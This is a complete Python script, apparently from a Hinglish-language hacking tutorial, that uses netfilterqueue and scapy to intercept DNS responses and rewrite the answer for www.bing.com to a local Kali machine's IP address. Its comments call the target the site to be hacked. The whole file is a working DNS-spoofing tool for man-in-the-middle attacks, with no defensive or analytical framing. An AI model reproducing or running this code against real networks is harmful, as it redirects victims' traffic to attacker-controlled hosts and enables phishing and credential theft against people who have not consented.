import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    # Packet ko Scapy format mein convert karo
    scapy_packet = scapy.IP(packet.get_payload())

    # Check karo: Kya isme DNS Response (DNSRR) hai?
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        
        # Target Website (Jise hack karna hai)
        target_site = "www.bing.com" 
        
        # Agar packet mein hamara target site hai
        if target_site in qname.decode():
            print("[+] Spoofing Target: " + target_site)
            
            # Answer ko badal kar APNI IP daal do
            # 192.168.1.X = Tumhari Kali Machine ki IP
            my_ip = "192.168.1.15" 
            
            answer = scapy.DNSRR(rrname=qname, rdata=my_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            # Checksums aur Length delete karo (Scapy khud recalculate karega)
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            # Modified packet wapis set karo
            packet.set_payload(bytes(scapy_packet))

    # Packet ko aage jaane do (Accept)
    packet.accept()

# Queue 0 ko bind karo aur function chalao
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()